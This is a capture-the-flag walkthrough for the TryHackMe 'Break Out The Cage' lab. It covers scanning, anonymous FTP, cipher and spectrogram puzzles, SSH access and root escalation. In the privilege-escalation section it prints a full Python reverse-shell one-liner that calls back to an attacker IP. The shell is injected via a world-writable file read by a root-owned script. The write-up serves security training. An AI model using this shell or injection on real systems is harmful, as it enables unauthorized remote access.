# Try Hack Me - 
Room Description

---
## Objectives  
1. What is Iston's password?
2. What's the user flag?
3. What's the root flag?
---
## Recon
Let's ping our maching and confirm that it is up and running.  
Once you see a ping responces then take the IP address and plug it into your browser to see if their is a Ib service running.  
![IbService](images/IbService.png "IbService")  
<br>
It seem like I do have a Ib page comming up.  
After clicking around it seems like none of the buttons actually work. So let's check out the source code of this page then.
![sourceCode](images/sourceCode.png "sourceCode")  
<br>
There doesn't seems to be anything special in the source codes so how about me move on to scanning the site.  

## Scanning and Enumeration
Command: `nmap -A -sC -sV -T4 -oN nmap\intinal.txt <ip>`  
Breakdown:
```
-A: do an extensive scan on these ports

-sC: Scan with default NSE scripts. Considered useful for discovery and safe

-sV: Attempts to determine the version of the service running on port

-T4: speed of nmap scan is 4/5 (personal preference of mine)

-oN: Normal output to the file normal.file
```
![nmap](images/nmap.png "nmap")  
Now that our intinal nmap scan is complet I can see that I have port 21, 22, and 80 open.  
Our FTP port "21" seems to have `Anonymous login alloId`, so lets try and log into it.  
<br>
![ftpLogin](images/ftpLogin.png "ftpLogin")  
<br>
Now that I am logged into the FTP. let's see what I can find out.  
After running our `ls` command it seem that there is a file call `dad_task`. How about I download a copy of that file to our local computer, in order to do that you will just need to type in get `<fileName>` and a copy of it will be downloaded to your current directory.  
![downloadFile](images/downloadFile.png "downloadFile")  
<br>
Once the file has been downloaded let's `cat` out the content of it.  
Now just at first glance I was say that this is a base64 encoded string.  

![content](images/content.png "content")  
So now let's head over to [CyberChef](https://gchq.github.io/CyberChef/) and see what happens when I use the From Base64 option.  
<br>
![output](images/output.png "output")  
After I decode the string from Base64 it seems that there is an additional cipher. I ran our results throug a couple of the cipher options from CyberChef and one stuck out to me, that was the vignere. This only stuck out to me because it required a key and it make me thing that I possible missed something.  

I am going to use `GoBuster` to see if there are any hidden directories.
Command: `gobuster -t 40 -u http://$ip -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
Breakdown
```
-t: Thread Usage, declare how mand thread you would like gobuster to use. (Default is 10)

-u: Full URL (including scheme), or base domain name.

-w: Path to the wordlist used for brute forcing (use – for stdin).

```
![gobuster](images/gobuster.png "gobuster")  
<br>
Seems like there are several directories that I have not explored yet.  
After poking around in each directory it seems like auditions is the only one that has anyting interesting.  
In order to download the file I will have to use `wget http://<ipaddres>/auditions/must_practice_corrupt_file.mp3`
After playing the audio file you can hear that there is some distortion. So I loaded it up in [audacity](https://www.audacityteam.org/), clicked the arrow beside the file name, selected spectrogram, and zoomed in on the distorted area.  
![key](images/key.png "key")  
<br>
When you zoom in close enough you will see some text, perhaps this could be our key to the vignere cipher from eariler. So lets head back to CyberChef and see what happens when I enter it.
<br>
![westonPass](images/westonPass.png "westonPass")  
<br>
It lookes like I found our first flage and possible the username and password to SSH.  
When I tried to log in I was suprised that it was successfull. Now lets see if I can find our user.txt file.
<br>
<br>

Once I are logged into the box lets confirm that I are. It sees I are in fact logged in as the Weston but it also seems that there is something running in the backgroud that is generating quotes.  
<br>
![ssh](images/ssh.png "ssh")  
Let's see if I can find out what is creating these quotes.  

`find / -type f -name "*quote*" -exec ls -la {} + 2> /dev/null`
![quote](images/quote.png "quote")  
<br>
After a little bit of digging I was able to find out that `spread_the_quotes.py` is the script that is responible for writting the Nicolas Cage quotes to the console. Maybe I can leverage this and use it to our advantage.
Upon further investigation I found out that only the root user can write to our `spread_the_quotes.py` but the `quotes` file can be changed by anyone.

Since the `spread_the_quotes.py` actually calls `quotes` we may be able to use this to craft our reverse shell.  
I used `vim` to open up the quotes file and then used the keybindings of `%d` to remove all content.  
Once you have added your reverse shell you will just need to sit up your netcat listern on your local computer and wait for the call to be made.  

Reverse Shell:
```
"hello" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your IP Address>",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**SUCCESS!!!**  

![listener](images/listener.png "listener")  
How about we see what kind of files there are and what is in them.  
There is a file called `Super_Duper_Checklist` and when we open it and look at the very last line it seems that we are presented what looks to be our user flag.  
![userFlag](images/userFlag.png "userFlag")  
<br>

## Getting Root
---
Now that we have found out user flage we will need to figure out how we we can escalate the privilege ouf the cage user to a root user.  
After looking aroud some I was able to find three emails where a conversation had taken place between Sean, Cage, & Weston.  

- email_1
    ```bash
    From - SeanArcher@BigManAgents.com
    To - Cage@nationaltreasure.com
    
    Hey Cage!
    
    There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
    planning stages at the moment. I've put a good word in for you, if you're lucky we 
    might be able to get you a part of an angry shop keeping or something? Would you be up
    for that, the money would be good and it'd look good on your acting CV.
    
    Regards
    
    Sean Archer
    ```
- email_2
  ```bash
  From - Cage@nationaltreasure.com
    To - SeanArcher@BigManAgents.com
    
    Dear Sean
    
    We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
    Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
    the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
    new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
    I could of made them great... great Sean.... I think you're missing my true potential.
    
    On a much lighter note thank you for helping me set up my home server, Weston helped too, but
    not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
    
    Yours
    
    Cage
  ```
- email_3
    ```bash
    From - Cage@nationaltreasure.com
    To - Weston@nationaltreasure.com
    
    Hey Son
    
    Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
    down what it said. Could you look into it please? I think it could be something to do with his
    account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
    sure he's out to get me. The note said:
    
    ***************
    
    The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
    was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
    hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
    ahahahhahaha. Ahhh Face it... he's just odd. 
    
    Regards
    
    The Legend - Cage
    ```
Within the latest email, we can see that there is a strings that looks like a chiper text. Now on the email, cage mentioned that his agent is obsessed with his face.
Earlier in this challenge we had to deciper some viginere text. So that is where we are going to start.

The dechipered text can be used as the root password for the machine

<br>

With the root password in hand I switched user using the `su` command and then confirmed that I was in fact Root.  

![rootAccess](images/rootAccess.png "rootAccess")  
Now that we have root access let check the `/root` directory to see if we can find out root flag.  
It would seem that instead of our root flag we have another `email_backup` folder and within that folder there are two emails.  

- Email 1
    ```bash
    From - SeanArcher@BigManAgents.com
    To - master@ActorsGuild.com

    Good Evening Master

    My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
    Eventually the whole world will see who Cage really is! Our masterplan is coming together
    master, I'm in your debt.

    Thank you
    ```
<br>

- Root flag  
    
    The root flag can be found inside one fo the file inside the `email_backup` folder.
    ```bash
    From - master@ActorsGuild.com
    To - SeanArcher@BigManAgents.com
    
    Dear Sean
    
    I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
    strong... so strong that I feel the power to promote you from disciple to crony. I hope you
    don't abuse your new found strength. To ascend yourself to this level please use this code:
    
    ***********************************
    
    Thank you
    
    Sean Archer
    ```  
## Congratulations you have just completed the Break Out The Cage challenge!
